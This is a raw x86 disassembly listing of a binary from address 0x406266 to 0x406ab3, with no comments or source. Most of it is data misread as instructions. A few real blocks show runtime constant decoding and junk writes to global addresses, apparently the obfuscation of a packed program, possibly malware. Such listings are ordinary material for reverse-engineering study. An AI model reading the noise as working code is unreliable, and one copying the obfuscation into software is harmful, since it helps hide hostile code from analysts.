  406266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406267:	sbb    ah,BYTE PTR [ecx+0x15e899e6]
  40626d:	retf   
  40626e:	xchg   esp,eax
  40626f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406270:	mov    cl,0x3a
  406272:	sbb    BYTE PTR [edx],ch
  406274:	jne    0x40629b
  406276:	mov    BYTE PTR [esi+0x390cba55],dh
  40627c:	push   ebx
  40627d:	popf   
  40627e:	pop    es
  40627f:	mov    ds:0x3e1746d4,eax
  406284:	push   esp
  406285:	push   esi
  406286:	ss xchg ebx,eax
  406288:	call   0xbd3f250
  40628d:	pop    esp
  40628e:	retf   0x6462
  406291:	addr16 cmp eax,0xfe2cf42a
  406297:	add    DWORD PTR [ebx+0x16],ebp
  40629a:	mov    edi,0x155eba36
  40629f:	test   bl,0xf8
  4062a2:	(bad)  
  4062a3:	stc    
  4062a4:	mov    bh,0xa8
  4062a6:	cmp    al,0x91
  4062a8:	mov    bh,0xcc
  4062aa:	loope  0x4062ca
  4062ac:	mov    bl,0x5c
  4062ae:	push   cs
  4062af:	and    al,0xe5
  4062b1:	cmp    ecx,esi
  4062b3:	into   
  4062b4:	retf   0xa807
  4062b7:	xor    DWORD PTR [esi+0x7fea3f43],edx
  4062bd:	popa   
  4062be:	push   esp
  4062bf:	pop    esp
  4062c0:	dec    ecx
  4062c1:	sub    BYTE PTR [eax-0x456a4ff],0x16
  4062c8:	mov    ?,WORD PTR [edi]
  4062ca:	pushf  
  4062cb:	xchg   BYTE PTR [eax-0x2],al
  4062ce:	add    ch,BYTE PTR [esi+eiz*8-0x5e]
  4062d2:	inc    ebp
  4062d3:	fucomp st(2)
  4062d5:	(bad)  
  4062d7:	xchg   edi,eax
  4062d8:	lea    edi,[esi]
  4062da:	into   
  4062db:	iret   
  4062dc:	and    DWORD PTR [ebp+0x45],esp
  4062df:	dec    esp
  4062e0:	mov    bh,0xe3
  4062e2:	pop    ss
  4062e3:	push   eax
  4062e4:	mov    dh,0xeb
  4062e6:	push   0xffffffb9
  4062e8:	add    DWORD PTR [ecx],0x6d94872a
  4062ee:	dec    ebp
  4062ef:	sub    cl,BYTE PTR [ebx+0x6]
  4062f2:	retf   0xce55
  4062f5:	xchg   esi,eax
  4062f6:	in     eax,0x8
  4062f8:	popf   
  4062f9:	test   esi,eax
  4062fb:	shr    BYTE PTR [ecx],1
  4062fd:	mov    ds:0xe7571ec7,al
  406302:	cmp    al,0x97
  406304:	sub    eax,0x3c897546
  406309:	(bad)  fs:[esi+0x20]
  40630d:	jg     0x4062d3
  40630f:	push   0xffffffc6
  406311:	(bad)  
  406312:	cli    
  406313:	jnp    0x4062c0
  406315:	fstp   st(5)
  406317:	pop    ebp
  406318:	arpl   WORD PTR [ebx-0x694a9742],bp
  40631e:	push   ss
  40631f:	loop   0x40633c
  406321:	sar    DWORD PTR [edx],1
  406323:	mov    al,ds:0x1bc39c88
  406328:	pop    ebx
  406329:	mov    ecx,DWORD PTR [di-0x7633]
  40632e:	sahf   
  40632f:	jo     0x406398
  406331:	scas   al,BYTE PTR es:[edi]
  406332:	cli    
  406333:	mov    ds:0xb27edd6e,eax
  406338:	xchg   ebp,eax
  406339:	xchg   edx,eax
  40633a:	in     eax,dx
  40633b:	in     eax,0x5
  40633d:	out    0x38,al
  40633f:	fistp  DWORD PTR [edx-0x6e]
  406342:	cmp    al,dh
  406344:	push   ecx
  406345:	ret    
  406346:	jnp    0x406305
  406348:	fbld   TBYTE PTR [eax+0x7ff98ecb]
  40634e:	xor    ch,BYTE PTR [ebx+0x24]
  406351:	call   0x44457ba1
  406356:	cmp    esi,DWORD PTR ds:0x6d4fb8c5
  40635c:	sub    DWORD PTR [edi+0x1ec0c9cd],esp
  406362:	mov    ebx,0xb94c10e0
  406367:	mov    ch,0xbc
  406369:	(bad)  
  40636a:	push   ebx
  40636b:	retf   
  40636c:	inc    ecx
  40636d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40636e:	aaa    
  40636f:	sbb    al,0xeb
  406371:	leave  
  406372:	fcom   QWORD PTR [esi-0xe]
  406375:	cmp    al,0xf0
  406377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406378:	test   DWORD PTR [edi-0x2e],eax
  40637b:	sub    bl,al
  40637d:	dec    ebx
  40637e:	and    al,BYTE PTR [edi+0xf]
  406381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406382:	sbb    edx,DWORD PTR [ebx+edx*4]
  406385:	stos   DWORD PTR es:[edi],eax
  406386:	jmp    0x406322
  406388:	mov    al,ds:0x2910ef22
  40638d:	xchg   ebp,eax
  40638e:	xor    bl,0xab
  406391:	inc    eax
  406392:	mov    edi,0xac34163e
  406397:	push   cs
  406398:	push   esp
  406399:	rcr    al,cl
  40639b:	addr16 into 
  40639d:	push   ebp
  40639e:	inc    ecx
  40639f:	add    DWORD PTR [ebx+0x22],ebp
  4063a2:	fld    DWORD PTR [edx+ebp*1]
  4063a5:	lds    ecx,FWORD PTR [eax]
  4063a7:	nop
  4063a8:	dec    ebx
  4063a9:	adc    BYTE PTR [ebx-0x3f],cl
  4063ac:	or     BYTE PTR [ecx+0x158ace4f],cl
  4063b2:	pop    ebp
  4063b3:	mov    ah,0x54
  4063b5:	xor    edx,ebp
  4063b7:	js     0x406397
  4063b9:	mov    ch,0x96
  4063bb:	sbb    ebp,edx
  4063bd:	mov    ch,0x4c
  4063bf:	fstp   QWORD PTR [ecx]
  4063c1:	xchg   ebx,eax
  4063c2:	jbe    0x4063a0
  4063c4:	das    
  4063c5:	mov    ch,0x91
  4063c7:	push   es
  4063c8:	mov    ds:0x83529b0,eax
  4063cd:	jle    0x4063a3
  4063cf:	xchg   esi,eax
  4063d0:	cld    
  4063d1:	and    al,0x10
  4063d3:	pop    ebx
  4063d4:	lea    edi,[esp+edi*8]
  4063d7:	lods   al,BYTE PTR ds:[esi]
  4063d8:	sbb    edi,DWORD PTR [ebx+esi*2]
  4063db:	xchg   edx,eax
  4063dc:	push   ecx
  4063dd:	shl    BYTE PTR [edi-0x696981d],0x34
  4063e4:	cs out dx,al
  4063e6:	mov    ecx,0x5913c865
  4063eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063ec:	and    ah,dh
  4063ee:	mov    ecx,0xc319e31f
  4063f3:	test   al,0x4d
  4063f5:	adc    bh,BYTE PTR [esi-0x38]
  4063f8:	rcl    ah,1
  4063fa:	pop    esi
  4063fb:	mov    esp,0x6c3d9564
  406400:	adc    ecx,DWORD PTR [esi]
  406402:	mov    dl,0xef
  406404:	push   ebx
  406405:	jmp    0xff93e2ab
  40640a:	xchg   ecx,eax
  40640b:	cmp    BYTE PTR [eax+0x14185f5e],dh
  406411:	and    al,0xea
  406413:	sub    ch,0x92
  406416:	mov    ah,0xd5
  406418:	sub    cl,BYTE PTR [esi]
  40641a:	cli    
  40641b:	pop    ecx
  40641c:	push   cs
  40641d:	jb     0x4063b3
  40641f:	js     0x40645f
  406421:	stc    
  406422:	mov    bh,0x35
  406424:	mov    ah,0x60
  406426:	retf   0xb3ab
  406429:	nop
  40642a:	jb     0x4063c6
  40642c:	or     DWORD PTR [esi+0x162dfd97],ebx
  406432:	inc    esp
  406434:	leave  
  406435:	jne    0x4063c5
  406437:	mov    bh,0x2c
  406439:	cmove  ecx,esi
  40643c:	adc    eax,0x1e512792
  406441:	mov    ebx,0x856da264
  406446:	mov    DWORD PTR [ebp-0x20],eax
  406449:	xor    DWORD PTR ds:0x434386,0x4326f4
  406453:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  40645a:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406461:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406468:	xor    DWORD PTR ds:0x432de2,edx
  40646e:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406475:	xor    eax,DWORD PTR ds:0x43439a
  40647b:	mov    eax,DWORD PTR [ebp-0xc]
  40647e:	sub    DWORD PTR ds:0x432de2,0x4326f0
  406488:	xor    eax,esi
  40648a:	add    DWORD PTR ds:0x4326f0,0x5eb6
  406494:	add    eax,edi
  406496:	adc    DWORD PTR ds:0x432dd6,0x2bbb
  4064a0:	mov    DWORD PTR [ebp-0x18],eax
  4064a3:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  4064aa:	sbb    eax,0x6f73
  4064af:	mov    BYTE PTR [ebp-0x1],0x67
  4064b3:	or     eax,0xf78
  4064b8:	mov    eax,DWORD PTR [ebp-0xc]
  4064bb:	xor    eax,esi
  4064bd:	add    eax,edi
  4064bf:	mov    DWORD PTR [ebp-0x18],eax
  4064c2:	neg    eax
  4064c4:	mov    eax,DWORD PTR [ebp-0x24]
  4064c7:	sbb    DWORD PTR ds:0x4326ec,0x6660
  4064d1:	xor    eax,esi
  4064d3:	add    eax,edi
  4064d5:	sub    DWORD PTR ds:0x43442d,0x50c
  4064df:	push   eax
  4064e0:	sbb    DWORD PTR ds:0x4326f0,edx
  4064e6:	mov    eax,DWORD PTR [ebp-0x28]
  4064e9:	sub    DWORD PTR ds:0x432dd2,0x7292
  4064f3:	xor    eax,esi
  4064f5:	adc    DWORD PTR ds:0x43438e,0x434415
  4064ff:	add    eax,edi
  406501:	push   eax
  406502:	add    DWORD PTR ds:0x434386,ebx
  406508:	mov    eax,DWORD PTR [ebp-0x1c]
  40650b:	add    DWORD PTR ds:0x432dbe,0x432de6
  406515:	xor    eax,esi
  406517:	add    eax,edi
  406519:	add    DWORD PTR ds:0x434411,0x43441d
  406523:	push   eax
  406524:	lea    eax,[ebp-0x78]
  406527:	push   eax
  406528:	push   DWORD PTR [ebp-0xc]
  40652b:	adc    DWORD PTR ds:0x434386,0x78bf
  406535:	push   DWORD PTR [ebp-0x14]
  406538:	call   0x4055a2
  40653d:	sub    DWORD PTR ds:0x43439a,0x4326fc
  406547:	jmp    0x406894
  40654c:	test   al,0x25
  40654e:	xor    al,0x4
  406550:	mov    cl,0x11
  406552:	test   al,0xb1
  406554:	push   ebx
  406555:	fcmovb st,st(7)
  406557:	fistp  WORD PTR [esi]
  406559:	mov    ds:0x3e6b1912,eax
  40655e:	jo     0x4065d0
  406560:	and    BYTE PTR [ebp+0x70],bh
  406563:	jo     0x40652a
  406565:	sar    DWORD PTR [edx-0x3e7ede74],0x12
  40656c:	out    dx,eax
  40656d:	xchg   edx,eax
  40656e:	cmc    
  40656f:	sub    dh,0x5b
  406572:	sti    
  406573:	out    0x0,eax
  406575:	dec    esi
  406576:	mov    cl,0x60
  406578:	mov    edx,0x4aa59739
  40657d:	sti    
  40657e:	push   esp
  40657f:	inc    eax
  406580:	out    dx,al
  406581:	adc    eax,DWORD PTR [edx+0x7b649231]
  406587:	mov    cl,0xa3
  406589:	jb     0x4065c0
  40658b:	ror    BYTE PTR [esi+0x246c9da3],1
  406591:	int    0x9b
  406593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406594:	dec    esp
  406595:	in     eax,dx
  406596:	mov    eax,ds:0x20adacf2
  40659b:	call   0xec34:0x5d2ed000
  4065a2:	inc    eax
  4065a3:	and    DWORD PTR [edi+0x2e9be88e],edx
  4065a9:	xlat   BYTE PTR ds:[ebx]
  4065aa:	(bad)  
  4065ab:	sti    
  4065ac:	cmp    DWORD PTR [edi],esp
  4065ae:	test   ch,bl
  4065b0:	lock ror esp,1
  4065b3:	sub    eax,0xb6b84fad
  4065b8:	jbe    0x406566
  4065ba:	push   esi
  4065bb:	out    0xb9,al
  4065bd:	test   BYTE PTR [ebx],ch
  4065bf:	mov    ecx,0x794e9248
  4065c4:	sub    DWORD PTR [ecx],ecx
  4065c6:	or     BYTE PTR [esi],bh
  4065c8:	sub    al,0xb
  4065ca:	imul   ebx,DWORD PTR [ecx+0x36],0x434f9f45
  4065d1:	les    edi,FWORD PTR [eax+0xc593f9a]
  4065d7:	jae    0x406596
  4065d9:	xchg   ebp,eax
  4065da:	xor    eax,DWORD PTR [esi-0x41]
  4065dd:	cmp    eax,DWORD PTR [eax+0x25]
  4065e0:	mov    edi,0x28fbf9aa
  4065e5:	cmp    al,0xf9
  4065e7:	scas   al,BYTE PTR es:[edi]
  4065e8:	and    cl,0x7e
  4065eb:	inc    ebx
  4065ec:	jmp    0x4065da
  4065ee:	and    al,0x6b
  4065f0:	loopne 0x4065c6
  4065f2:	out    dx,al
  4065f3:	sbb    edx,DWORD PTR [esi]
  4065f5:	xchg   ebx,eax
  4065f6:	jmp    0xbb7313ce
  4065fb:	leave  
  4065fc:	scas   eax,DWORD PTR es:[edi]
  4065fd:	fisub  DWORD PTR [esp+eiz*2-0x5a]
  406601:	lds    edi,FWORD PTR [esi-0x99f4377]
  406607:	jg     0x406601
  406609:	fidivr DWORD PTR [ecx-0x13]
  40660c:	push   ecx
  40660d:	mov    dh,0x22
  40660f:	lods   al,BYTE PTR ds:[esi]
  406610:	sbb    bh,BYTE PTR [eax-0x76d17c8c]
  406616:	sti    
  406617:	sbb    DWORD PTR [ebx-0x6bee0b54],ebp
  40661d:	xor    ebx,DWORD PTR [ebx-0x39]
  406620:	push   0xffffff9e
  406622:	add    eax,0x217450e7
  406627:	or     DWORD PTR [edi-0x64],edx
  40662a:	jmp    0x406635
  40662c:	pop    ss
  40662d:	rcl    BYTE PTR [esi+edx*2],0x6
  406631:	push   0x2f
  406633:	fs loope 0x4065d6
  406636:	sbb    al,BYTE PTR [esi+edx*1-0x5faa01a1]
  40663d:	repz mov dh,0xb2
  406640:	lods   al,BYTE PTR ds:[esi]
  406641:	(bad)  
  406642:	fistp  WORD PTR [ecx]
  406644:	push   edx
  406645:	xchg   edi,eax
  406646:	repnz sbb dl,al
  406649:	xor    al,0xc5
  40664b:	mov    dh,BYTE PTR [eax-0x62855a46]
  406651:	mov    fs:0xcd682cda,al
  406657:	cmp    cl,BYTE PTR [esi-0x6c974e1b]
  40665d:	add    al,0x74
  40665f:	lock cli 
  406661:	sar    esi,1
  406663:	imul   esi,DWORD PTR [ecx],0x7149e0ad
  406669:	(bad)  
  40666a:	inc    ebx
  40666b:	pop    ebp
  40666c:	inc    ebx
  40666d:	repz jmp 0xb6d13427
  406673:	pop    ebp
  406674:	into   
  406675:	int3   
  406676:	xchg   BYTE PTR [ecx+0x2bb7392e],al
  40667c:	push   es
  40667d:	test   al,0x13
  40667f:	mov    ch,0xd1
  406681:	mov    esi,esi
  406683:	push   ebx
  406684:	sbb    al,0xc7
  406686:	or     DWORD PTR [edx+0x4],eax
  406689:	out    0x24,eax
  40668b:	sahf   
  40668c:	mul    eax
  40668e:	loope  0x4066dc
  406690:	(bad)  
  406691:	(bad)  
  406693:	fidivr DWORD PTR [edi-0x5c8bb1ff]
  406699:	data16 mov ch,0xcb
  40669c:	pop    esi
  40669d:	fwait
  40669e:	sub    eax,0xe261c280
  4066a3:	xor    eax,0x2642b284
  4066a8:	jae    0x40666c
  4066aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066ab:	push   edx
  4066ac:	pop    edi
  4066ad:	rcl    DWORD PTR [edx+0x4007a12d],1
  4066b3:	lods   al,BYTE PTR ds:[esi]
  4066b4:	into   
  4066b5:	nop
  4066b6:	in     al,dx
  4066b7:	mov    ds:0x1b57d229,al
  4066bc:	xor    bh,al
  4066be:	and    al,0x1b
  4066c0:	pop    edx
  4066c1:	clc    
  4066c2:	cwde   
  4066c3:	pop    ds
  4066c4:	cmp    eax,0x3434e4bd
  4066c9:	adc    edi,eax
  4066cb:	mov    eax,0xef57a6ba
  4066d0:	and    ah,ah
  4066d2:	cmp    ah,dh
  4066d4:	js     0x40666e
  4066d6:	jae    0x40668e
  4066d8:	adc    esi,DWORD PTR [eax-0x1c688359]
  4066de:	in     al,0x3a
  4066e0:	gs cmc 
  4066e2:	ins    DWORD PTR es:[edi],dx
  4066e3:	call   FWORD PTR [ebx+0x36f67b8a]
  4066e9:	pop    ebp
  4066ea:	add    BYTE PTR [esi-0x19],bl
  4066ed:	sub    bl,BYTE PTR [ebx+0x2b]
  4066f0:	ds inc ecx
  4066f2:	sbb    cl,BYTE PTR [edi]
  4066f4:	js     0x4066c5
  4066f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066f7:	in     al,0xd5
  4066f9:	pop    edx
  4066fa:	das    
  4066fb:	daa    
  4066fc:	adc    DWORD PTR [di+0x18a8],0x803c6116
  406705:	in     eax,0x27
  406707:	les    edi,FWORD PTR es:[eax+0x7e17109d]
  40670e:	mov    edi,0x7cc945d9
  406713:	cmp    cl,BYTE PTR [edi]
  406715:	call   0x40ca453b
  40671a:	add    BYTE PTR [ebx-0x2c],dh
  40671d:	xchg   BYTE PTR [edi+0x3b],bh
  406720:	das    
  406721:	aam    0x6d
  406723:	ror    al,0xa7
  406726:	dec    esp
  406727:	rcr    DWORD PTR [ecx+0x4b],cl
  40672a:	and    BYTE PTR [ecx+0x18],0xd5
  40672e:	inc    esi
  40672f:	mov    ecx,0xcefadef2
  406734:	jg     0x4066dd
  406736:	pop    ebp
  406737:	jne    0x406744
  406739:	xchg   esp,eax
  40673a:	mov    ds:0xd4578c74,al
  40673f:	ins    BYTE PTR es:[edi],dx
  406740:	pop    ds
  406741:	rol    dl,0x32
  406744:	pop    esi
  406745:	mov    eax,ds:0x8e21551
  40674a:	or     eax,0x6b0c4b0c
  40674f:	pop    edi
  406750:	cmp    dh,dh
  406752:	dec    esi
  406753:	stos   DWORD PTR es:[edi],eax
  406754:	push   0xcd3daff3
  406759:	into   
  40675a:	mov    ch,0xa8
  40675c:	into   
  40675d:	ins    BYTE PTR es:[edi],dx
  40675e:	xor    BYTE PTR [ecx-0x59],dh
  406761:	xchg   ecx,eax
  406762:	pop    edx
  406763:	sub    ah,BYTE PTR [ebx]
  406765:	and    ah,BYTE PTR ds:0xfd1deaed
  40676b:	pop    esp
  40676c:	out    dx,al
  40676d:	mov    bh,al
  40676f:	adc    BYTE PTR [esi+0x54],ah
  406772:	popa   
  406773:	adc    ebx,eax
  406775:	scas   eax,DWORD PTR es:[edi]
  406776:	out    0x1d,eax
  406778:	push   edx
  406779:	int    0x8
  40677b:	pop    ss
  40677c:	pop    ebp
  40677d:	neg    ebp
  40677f:	push   es
  406780:	mov    bl,0xf8
  406782:	jg     0x46b38863
  406788:	icebp  
  406789:	(bad)  
  40678a:	ja     0x40671b
  40678c:	xchg   esp,eax
  40678d:	mov    ebp,0xf0f3e43
  406792:	dec    esi
  406793:	and    BYTE PTR [ecx],al
  406795:	mov    eax,0xfd16767a
  40679a:	imul   edx,esi,0xffffff8d
  40679d:	or     DWORD PTR [ebx],edx
  40679f:	mov    ebx,0x8fab0494
  4067a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067a5:	jnp    0x406789
  4067a7:	sub    BYTE PTR [edi-0x23],al
  4067aa:	pop    ecx
  4067ab:	or     ecx,DWORD PTR [esi]
  4067ad:	sub    al,0xff
  4067af:	(bad)  
  4067b0:	sub    esp,ecx
  4067b2:	xchg   edi,eax
  4067b3:	pushf  
  4067b4:	dec    esi
  4067b5:	ror    BYTE PTR [esi],cl
  4067b7:	or     DWORD PTR [esi+0x54],edx
  4067ba:	pop    ss
  4067bb:	xor    DWORD PTR [esi+0x1a684ac8],0x34
  4067c2:	and    BYTE PTR [ebp-0x1097ad9f],bl
  4067c8:	lods   al,BYTE PTR ds:[esi]
  4067c9:	jo     0x406834
  4067cb:	or     ebp,DWORD PTR [ecx]
  4067cd:	inc    eax
  4067ce:	cmp    bl,al
  4067d0:	shl    DWORD PTR [ebx-0x5ae64dbc],cl
  4067d6:	pop    eax
  4067d7:	xchg   DWORD PTR [ecx],ecx
  4067d9:	mov    BYTE PTR [eax+eax*4],al
  4067dc:	pop    edx
  4067dd:	je     0x406775
  4067df:	fsubr  DWORD PTR [ebp-0x21043aaf]
  4067e5:	test   al,0x8a
  4067e7:	jae    0x406781
  4067e9:	xchg   ecx,eax
  4067ea:	pop    ss
  4067eb:	inc    ebp
  4067ec:	xchg   ebx,eax
  4067ed:	div    BYTE PTR [edx+0x2e2ef81c]
  4067f3:	push   edi
  4067f4:	cld    
  4067f5:	jecxz  0x406782
  4067f7:	mov    dh,0xc7
  4067f9:	sub    edx,DWORD PTR [esi-0x61f67a37]
  4067ff:	mov    BYTE PTR [eax],0xb4
  406802:	jmp    DWORD PTR [edx-0x45367ced]
  406808:	push   ss
  406809:	xchg   ecx,eax
  40680a:	push   ebp
  40680b:	popa   
  40680c:	int3   
  40680d:	mov    edi,0x10c30416
  406812:	js     0x40688f
  406814:	mov    eax,ds:0x44930c94
  406819:	hlt    
  40681a:	stos   DWORD PTR es:[edi],eax
  40681b:	and    dl,BYTE PTR [edi-0x7c898065]
  406821:	scas   al,BYTE PTR es:[edi]
  406822:	iret   
  406823:	scas   eax,DWORD PTR es:[edi]
  406824:	popf   
  406825:	fstp   QWORD PTR [ebx-0x60]
  406828:	and    dh,dh
  40682a:	retf   
  40682b:	cmp    ah,BYTE PTR [edx-0x40f678d9]
  406831:	out    dx,eax
  406832:	pop    ebx
  406833:	cwde   
  406834:	add    BYTE PTR [ebx+0x11499340],al
  40683a:	mov    BYTE PTR [eax],dh
  40683c:	xchg   esi,eax
  40683d:	fist   WORD PTR [ebx]
  40683f:	pop    eax
  406840:	div    ch
  406842:	mov    bh,0xed
  406844:	std    
  406845:	xchg   edx,eax
  406846:	xor    al,dh
  406848:	mov    bh,0x18
  40684a:	loopne 0x4068cb
  40684c:	push   0x84e932cc
  406851:	push   cs
  406852:	fwait
  406853:	xchg   cx,ax
  406855:	sub    eax,0xcbc2db5f
  40685a:	daa    
  40685b:	outs   dx,BYTE PTR ds:[esi]
  40685c:	adc    ebx,DWORD PTR [ebx]
  40685e:	hlt    
  40685f:	sbb    DWORD PTR [ebx-0x352473be],ebp
  406865:	ja     0x4068c9
  406867:	ss mov eax,0xe0f7569c
  40686d:	mov    cl,0x50
  40686f:	or     BYTE PTR [ebx],ch
  406871:	ja     0x406824
  406873:	push   ebx
  406874:	dec    edi
  406875:	iret   
  406876:	xchg   edx,eax
  406877:	cmc    
  406878:	inc    edi
  406879:	outs   dx,BYTE PTR ds:[esi]
  40687a:	push   edi
  40687b:	fisttp DWORD PTR [ecx+0x5582d3e3]
  406881:	cmp    al,0x6c
  406883:	xchg   ebp,eax
  406884:	jecxz  0x406835
  406886:	loop   0x406848
  406888:	jmp    0x19:0x210ffc7c
  40688f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406890:	ja     0x40685d
  406892:	sbb    DWORD PTR [ebp+eax*4-0x40],0xffffffc7
  406897:	add    eax,0x434425
  40689c:	jno    0x406917
  40689e:	add    BYTE PTR [eax],al
  4068a0:	je     0x406953
  4068a6:	lea    eax,[ebp-0x78]
  4068a9:	sbb    DWORD PTR ds:0x432dca,0x1ea3
  4068b3:	push   eax
  4068b4:	sbb    DWORD PTR ds:0x432de6,0x1ec2
  4068be:	mov    eax,DWORD PTR [ebp-0x14]
  4068c1:	and    DWORD PTR ds:0x432de2,0x7d59
  4068cb:	xor    eax,esi
  4068cd:	add    eax,edi
  4068cf:	push   eax
  4068d0:	mov    DWORD PTR ds:0x434366,0x11
  4068da:	cmp    DWORD PTR ds:0x434366,0x0
  4068e1:	je     0x406937
  4068e7:	cmp    DWORD PTR ds:0x434366,0x6
  4068ee:	jne    0x40690c
  4068f4:	push   0x434421
  4068f9:	push   DWORD PTR [ebp-0xc]
  4068fc:	push   0x55d8
  406901:	push   0x8f3f
  406906:	call   DWORD PTR ds:0x432c3a
  40690c:	cmp    DWORD PTR ds:0x434366,0x7
  406913:	jne    0x406924
  406919:	mov    eax,ds:0x434366
  40691e:	dec    eax
  40691f:	mov    ds:0x434366,eax
  406924:	xor    eax,eax
  406926:	add    eax,DWORD PTR ds:0x434366
  40692c:	dec    eax
  40692d:	mov    ds:0x434366,eax
  406932:	jmp    0x4068da
  406937:	mov    eax,DWORD PTR [ebp-0x10]
  40693a:	add    eax,0xaa
  40693f:	push   eax
  406940:	mov    eax,DWORD PTR [ebp-0x10]
  406943:	mov    eax,DWORD PTR [eax+0x198]
  406949:	push   DWORD PTR [eax]
  40694b:	call   0x40d076
  406950:	mov    DWORD PTR [ebp-0x8],eax
  406953:	cmp    DWORD PTR [ebp-0x8],0x0
  406957:	lea    eax,[ebp+0x4]
  40695a:	mov    DWORD PTR [ebp-0x20],eax
  40695d:	je     0x407755
  406963:	lea    eax,[ebp-0x18]
  406966:	push   eax
  406967:	mov    eax,DWORD PTR [ebp-0x2c]
  40696a:	xor    eax,esi
  40696c:	add    eax,edi
  40696e:	push   eax
  40696f:	mov    eax,DWORD PTR [ebp-0x1c]
  406972:	xor    eax,esi
  406974:	add    eax,edi
  406976:	push   eax
  406977:	push   DWORD PTR [ebp-0x8]
  40697a:	lea    eax,[ebp-0x78]
  40697d:	push   eax
  40697e:	jmp    0x406ccb
  406983:	mov    esi,?
  406985:	add    BYTE PTR [esi+0xa],bh
  406988:	mov    cs,WORD PTR [edx+0x39f75e8a]
  40698e:	aaa    
  40698f:	mov    dl,0x74
  406991:	sub    BYTE PTR [ebx],bl
  406993:	sbb    edi,DWORD PTR [edx]
  406995:	jo     0x406a07
  406997:	and    BYTE PTR [ebp+0x70],bh
  40699a:	jo     0x406a04
  40699c:	dec    ecx
  40699d:	sub    BYTE PTR [edx],bl
  40699f:	outs   dx,BYTE PTR ds:[esi]
  4069a0:	cs push ss
  4069a2:	push   ebp
  4069a3:	push   0x3a
  4069a5:	xchg   esp,eax
  4069a6:	dec    eax
  4069a7:	mov    ebx,0x8a721f72
  4069ac:	in     eax,0x5
  4069ae:	mov    BYTE PTR [ebx-0x5919f78f],dl
  4069b4:	leave  
  4069b5:	dec    esi
  4069b6:	in     eax,dx
  4069b7:	inc    edx
  4069b8:	scas   eax,DWORD PTR es:[di]
  4069ba:	imul   ebp,esp,0x6a
  4069bd:	dec    ebp
  4069be:	or     eax,0x9de69615
  4069c3:	xor    ch,BYTE PTR [edi]
  4069c5:	inc    ebp
  4069c6:	mov    bl,0x56
  4069c8:	adc    DWORD PTR [eax-0x19889830],esp
  4069ce:	bound  esp,QWORD PTR [ecx+0x44]
  4069d1:	mov    eax,0xd40b2ee8
  4069d6:	sub    esi,DWORD PTR ds:0xd534dffb
  4069dc:	push   eax
  4069dd:	repz mov eax,eax
  4069e0:	fcom   st(4)
  4069e2:	mov    bh,BYTE PTR [edx+edi*4]
  4069e5:	gs loope 0x40698b
  4069e8:	gs jecxz 0x4069de
  4069eb:	jnp    0x406a2c
  4069ed:	xor    BYTE PTR [eax+0x411bb4b3],cl
  4069f3:	mov    ds:0x5b865a0d,eax
  4069f8:	jmp    DWORD PTR [edx+0x2b]
  4069fb:	mov    cl,BYTE PTR [ecx+0x6c]
  4069fe:	mov    DWORD PTR [edi-0x23],ecx
  406a01:	adc    BYTE PTR [esi],al
  406a03:	jmp    0x1979c856
  406a08:	push   0xfdfbed12
  406a0d:	mov    esi,0xddb176ee
  406a12:	xlat   BYTE PTR ds:[ebx]
  406a13:	das    
  406a14:	pop    ds
  406a15:	mov    al,ds:0x18d0604
  406a1a:	repnz xchg edi,eax
  406a1c:	js     0x406a5e
  406a1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a1f:	xchg   esi,eax
  406a20:	(bad)  
  406a21:	scas   eax,DWORD PTR es:[edi]
  406a22:	jno    0x406a07
  406a24:	sbb    al,dl
  406a26:	pop    ds
  406a27:	fbld   TBYTE PTR [esi+0xa]
  406a2a:	push   esp
  406a2b:	nop
  406a2c:	pop    edx
  406a2d:	das    
  406a2e:	sbb    al,0xe3
  406a30:	and    BYTE PTR [esi],dh
  406a32:	xchg   ebx,eax
  406a33:	in     al,dx
  406a34:	and    DWORD PTR [ebx+0xc],ecx
  406a37:	call   0x3d80a6b2
  406a3c:	mov    al,ds:0x4fde934f
  406a41:	or     eax,DWORD PTR [edx+0x633f7417]
  406a47:	fwait
  406a48:	mov    ch,0x4f
  406a4a:	xor    eax,0x84b99620
  406a4f:	dec    esi
  406a50:	xchg   edi,eax
  406a51:	mov    esi,esi
  406a53:	loopne 0x4069ed
  406a55:	addr16 and ah,cl
  406a58:	loop   0x406a71
  406a5a:	stc    
  406a5b:	pop    ds
  406a5c:	xchg   ebp,eax
  406a5d:	ror    ah,1
  406a5f:	(bad)  
  406a60:	sub    al,0x3e
  406a62:	or     dl,BYTE PTR [esi+0x79]
  406a65:	loope  0x406a28
  406a67:	mov    ebx,0xb1635c1f
  406a6c:	xor    eax,0xc2e94268
  406a71:	stos   BYTE PTR es:[edi],al
  406a72:	pop    edx
  406a73:	cmp    ecx,esi
  406a75:	daa    
  406a76:	ins    DWORD PTR es:[edi],dx
  406a77:	and    ebp,DWORD PTR [edi+0x3bdaf9e0]
  406a7d:	adc    DWORD PTR [edi+ebp*2-0x64],ecx
  406a81:	adc    eax,0x485ace24
  406a86:	mov    fs,ecx
  406a88:	imul   BYTE PTR [eax+ecx*2-0x5e655e7c]
  406a8f:	push   esi
  406a90:	aaa    
  406a91:	repz jnp 0x406a4f
  406a94:	cmp    ebp,DWORD PTR [esi-0x54401d79]
  406a9a:	pop    edx
  406a9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a9c:	jecxz  0x406ae4
  406a9e:	pop    ecx
  406a9f:	and    eax,0x68a37e32
  406aa4:	mov    bl,0xc
  406aa6:	cmp    bh,BYTE PTR [ecx-0x7f]
  406aa9:	push   ebp
  406aaa:	add    dl,ch
  406aac:	and    DWORD PTR [edi+0x36f84b3a],0x0
  406ab3:	mov    eax,DWORD PTR [ebp+0x70580afa]
